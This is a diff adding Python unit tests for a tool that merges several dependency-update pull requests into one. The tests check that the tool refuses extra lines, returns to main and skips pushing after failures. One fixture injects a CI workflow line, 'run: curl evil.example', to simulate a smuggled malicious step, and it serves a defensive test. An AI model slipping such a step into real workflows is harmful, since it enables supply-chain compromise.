@@ -314,6 +314,61 @@ def test_consolidate_family_refuses_when_union_has_extra_lines():
     assert not ok
     assert "union" in message.lower()
     assert not run.ran("pr create")
+    # Defense in depth: a regression that moved the push above the union
+    # check would still be caught here even if `pr create` were guarded.
+    assert not run.ran("push")
+
+
+def test_consolidate_family_returns_to_main_after_a_union_mismatch():
+    sneaky = COMBINED + (
+        "diff --git a/x b/x\n--- a/x\n+++ b/x\n@@ -1 +1 @@\n"
+        "+      run: curl evil.example\n"
+    )
+    run = FakeRun(
+        responses={
+            "diff origin/main...pr-450": DIFF_A,
+            "diff origin/main...pr-452": DIFF_B,
+            "diff origin/main...HEAD": sneaky,
+        }
+    )
+    ok, _ = dcon.consolidate_family("github/codeql-action", "4.38.0", [450, 452], run)
+    assert not ok
+    assert run.ran("switch main")
+
+
+def test_consolidate_family_returns_cleanly_when_pr_create_fails():
+    """Re-running a family whose PR already exists must not raise."""
+    run = FakeRun(
+        responses={
+            "diff origin/main...pr-450": DIFF_A,
+            "diff origin/main...pr-452": DIFF_B,
+            "diff origin/main...HEAD": COMBINED,
+        },
+        fail_on=("pr create",),
+    )
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert "command failure" in message.lower()
+    assert run.ran("switch main"), "must return to main even after a failure"
+
+
+def test_consolidate_family_returns_cleanly_when_push_fails():
+    run = FakeRun(
+        responses={
+            "diff origin/main...pr-450": DIFF_A,
+            "diff origin/main...pr-452": DIFF_B,
+            "diff origin/main...HEAD": COMBINED,
+        },
+        fail_on=("push",),
+    )
+    ok, message = dcon.consolidate_family(
+        "github/codeql-action", "4.38.0", [450, 452], run
+    )
+    assert not ok
+    assert not run.ran("pr create")
+    assert run.ran("switch main")
 
 
 def test_consolidate_family_aborts_on_merge_conflict():
